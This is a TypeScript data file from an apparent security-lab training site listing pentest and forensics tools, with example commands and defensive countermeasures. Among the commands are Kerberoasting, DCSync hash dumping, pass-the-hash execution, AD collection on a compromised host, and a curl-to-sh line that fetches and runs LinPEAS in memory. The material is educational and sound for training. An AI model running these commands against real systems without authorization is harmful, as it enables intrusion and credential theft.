/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 * 8WHIE Cyber Security Labs - Tools & Techniques Library
 * Copyright (c) 2026 8WHIE — Aryan Thakur
 */

import { ToolReference } from '../types.ts';

export const TOOLS_DATA: ToolReference[] = [
  {
    id: 'tool-nmap',
    name: 'Nmap (Network Mapper)',
    category: 'Reconnaissance',
    description: 'The industry-standard open-source network discovery and vulnerability scanner. Used in labs to map active hosts, identify open ports, detect operating systems, and evaluate service versions.',
    syntaxSummary: 'nmap [Scan Type...] [Options] {target specification}',
    commonCommands: [
      {
        command: 'nmap -sC -sV -p- -T4 --min-rate 1000 -oN initial_scan.txt 10.10.10.x',
        purpose: 'Comprehensive Full TCP Port Scan',
        explanation: 'Scans all 65,535 TCP ports with default safe scripts (-sC) and version detection (-sV), accelerating throughput with --min-rate 1000.'
      },
      {
        command: 'nmap -p 445 --script smb-vuln* -oN smb_audit.txt 10.10.10.x',
        purpose: 'SMB Vulnerability Audit',
        explanation: 'Executes the Nmap Scripting Engine (NSE) SMB vulnerability category against port 445 to detect unpatched protocols like MS17-010.'
      },
      {
        command: 'nmap -sU --top-ports 50 -oN udp_scan.txt 10.10.10.x',
        purpose: 'Fast UDP Port Scan',
        explanation: 'Probes the top 50 most prevalent UDP ports (e.g. SNMP, DNS, NTP, TFTP) to discover overlooked services.'
      }
    ],
    defensiveCountermeasure: 'Configure firewalls to rate-limit SYN packets, drop ICMP probes where appropriate, and disable non-essential listening services across network segments.'
  },
  {
    id: 'tool-burp-suite',
    name: 'Burp Suite',
    category: 'Web Exploitation',
    description: 'An integrated platform for performing security testing of web applications. Burp Proxy intercepts HTTP/S traffic, while Repeater and Intruder assist in payload verification and logic testing.',
    syntaxSummary: 'GUI Proxy with loopback listener on 127.0.0.1:8080 and embedded Chromium browser.',
    commonCommands: [
      {
        command: 'Burp Repeater: Ctrl + R / Cmd + R',
        purpose: 'Manual HTTP Request Manipulation',
        explanation: 'Sends intercepted HTTP requests to Repeater for iterative testing of injection vectors and custom header modifications.'
      },
      {
        command: 'Burp Intruder -> Sniper Attack Type',
        purpose: 'Single Payload Injection Position Testing',
        explanation: 'Cycles a wordlist through a single parameter position (e.g., parameter fuzzing or password auditing in authorized labs).'
      },
      {
        command: 'Burp Match and Replace Rule -> Add header X-Forwarded-For: 127.0.0.1',
        purpose: 'Internal Proxy Header Injection',
        explanation: 'Automatically modifies outbound requests to evaluate internal reverse proxy trust assumptions.'
      }
    ],
    defensiveCountermeasure: 'Enforce strict input validation, utilize parameterized queries, implement Web Application Firewalls (WAF), and enforce Content Security Policy (CSP) headers.'
  },
  {
    id: 'tool-gobuster',
    name: 'Gobuster',
    category: 'Reconnaissance',
    description: 'High-performance URI directory/file brute-forcer and DNS subdomain discoverer written in Go. Ideal for fast content enumeration on web servers.',
    syntaxSummary: 'gobuster [dir|dns|vhost|fuzz] -u <URL> -w <wordlist> [flags]',
    commonCommands: [
      {
        command: 'gobuster dir -u http://10.10.10.x/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,sh',
        purpose: 'Directory & File Extension Discovery',
        explanation: 'Concurrently brute-forces directories and files with extensions (.php, .txt, .html, .sh) using 50 threads.'
      },
      {
        command: 'gobuster vhost -u http://target.domain/ -w subdomains.txt --append-domain',
        purpose: 'Virtual Host (VHost) Enumeration',
        explanation: 'Detects hidden virtual hosts on multi-tenant web servers by modifying the Host header.'
      }
    ],
    defensiveCountermeasure: 'Disable directory indexing in web servers, remove sensitive backup files (.bak, .old) from web roots, and rate-limit HTTP 404 responses.'
  },
  {
    id: 'tool-bloodhound',
    name: 'BloodHound & SharpHound',
    category: 'Active Directory',
    description: 'Active Directory graph visualization tool using Neo4j to uncover complex, hidden attack paths, nested group memberships, and permission abuse vectors.',
    syntaxSummary: 'SharpHound.exe -c All / bloodhound-python -u user -p pass -d domain.local -c All',
    commonCommands: [
      {
        command: 'bloodhound-python -u student -p "LabPass123" -d lab.local -dc dc01.lab.local -c All -ns 10.10.10.x',
        purpose: 'Remote Active Directory Ingestion via Python',
        explanation: 'Collects AD objects, ACLs, trusts, and active sessions from Linux without compiling C# executables.'
      },
      {
        command: 'SharpHound.exe -c All --outputdirectory C:\\Windows\\Temp',
        purpose: 'Host-based Windows Data Collector',
        explanation: 'Runs the native C# collector on a compromised Windows domain-joined endpoint to harvest graph telemetry.'
      }
    ],
    defensiveCountermeasure: 'Audit domain object ACLs regularly, enforce Tiered Administrative Architecture (PAWs, Tier 0 isolation), and remove unneeded delegation permissions.'
  },
  {
    id: 'tool-impacket',
    name: 'Impacket Collection',
    category: 'Active Directory',
    description: 'A collection of Python classes for working with network protocols. Indispensable for interacting with SMB, MSRPC, Kerberos, and LDAP in lab testing.',
    syntaxSummary: 'python3 <script_name>.py [domain/user:password@target] [flags]',
    commonCommands: [
      {
        command: 'python3 GetUserSPNs.py lab.local/user:pass -dc-ip 10.10.10.x -request',
        purpose: 'Kerberoasting Service Principal Names',
        explanation: 'Requests Kerberos TGS tickets for accounts with SPNs configured, outputting hashes for offline recovery.'
      },
      {
        command: 'python3 secretsdump.py lab.local/administrator@10.10.10.x -just-dc-ntlm',
        purpose: 'DCSync Domain Controller Hash Extraction',
        explanation: 'Emulates Directory Replication Service (DRSUAPI) to retrieve domain password hashes remotely.'
      },
      {
        command: 'python3 psexec.py lab.local/user@10.10.10.x -hashes :<NTLM_HASH>',
        purpose: 'Pass-the-Hash Execution',
        explanation: 'Authenticates to target using NTLM password hash directly without needing plaintext credentials.'
      }
    ],
    defensiveCountermeasure: 'Enforce AES Kerberos encryption, use 25+ character Service Account passwords or Group Managed Service Accounts (gMSA), and monitor Event ID 4662.'
  },
  {
    id: 'tool-volatility',
    name: 'Volatility 3',
    category: 'Forensics',
    description: 'The premier open-source memory forensics framework for incident response and malware analysis. Extracts volatile runtime artifacts from RAM dumps.',
    syntaxSummary: 'python3 vol.py -f <memory_image> <os.plugin.PluginName> [options]',
    commonCommands: [
      {
        command: 'python3 vol.py -f memory.raw windows.pstree.PsTree',
        purpose: 'Reconstruct Process Hierarchy',
        explanation: 'Displays all running processes in a hierarchical parent-child tree to isolate rogue or orphaned executions.'
      },
      {
        command: 'python3 vol.py -f memory.raw windows.malfind.Malfind --dump',
        purpose: 'Identify Injected Code & Dump Memory',
        explanation: 'Detects memory pages with PAGE_EXECUTE_READWRITE protection and dumps the raw bytes to disk.'
      },
      {
        command: 'python3 vol.py -f memory.raw windows.netscan.NetScan',
        purpose: 'Network Socket Recovery',
        explanation: 'Recovers active and terminated TCP/UDP network connections, remote IPs, and associated process IDs.'
      }
    ],
    defensiveCountermeasure: 'Collect memory captures promptly during incident response before shutting down affected endpoints to preserve volatile RAM artifacts.'
  },
  {
    id: 'tool-ghidra',
    name: 'NSA Ghidra',
    category: 'Binary & Crypto',
    description: 'A comprehensive software reverse engineering framework featuring a powerful decompiler for x86, ARM, MIPS, and PowerPC architectures.',
    syntaxSummary: 'Run via ./ghidraRun GUI with CodeBrowser and Decompiler windows.',
    commonCommands: [
      {
        command: 'CodeBrowser -> Symbol Tree -> Functions -> entry / main',
        purpose: 'Locate Entry Point & Main Logic',
        explanation: 'Navigates to the binary entry function to begin control-flow analysis and variable type reconstruction.'
      },
      {
        command: 'Right-click variable in Decompiler -> Retype Variable (Ctrl + L)',
        purpose: 'Refine Decompiler Type Definitions',
        explanation: 'Assigns correct struct or pointer types (e.g. char*, uint32_t) to transform raw pointer offsets into readable high-level code.'
      }
    ],
    defensiveCountermeasure: 'Compile release binaries with symbol stripping (-s) and compiler protections (ASLR/PIE, Stack Canaries, FORTIFY_SOURCE).'
  },
  {
    id: 'tool-linpeas',
    name: 'LinPEAS & WinPEAS',
    category: 'Privilege Escalation',
    description: 'Automated privilege escalation auditing scripts that inspect filesystems, environment variables, credentials in memory, and system configurations.',
    syntaxSummary: './linpeas.sh [flags] | winpeas.exe [flags]',
    commonCommands: [
      {
        command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
        purpose: 'Execute LinPEAS in Memory',
        explanation: 'Pipes LinPEAS directly into the shell to avoid writing artifacts to disk on lab systems.'
      },
      {
        command: '.\\winPEASany.exe quiet cmd fast',
        purpose: 'Rapid Windows Host Privilege Audit',
        explanation: 'Runs key checks on Windows services, registry keys, and cached credentials with minimal console output.'
      }
    ],
    defensiveCountermeasure: 'Regularly audit system configurations against CIS benchmarks and enforce least-privilege principles on server infrastructure.'
  }
];
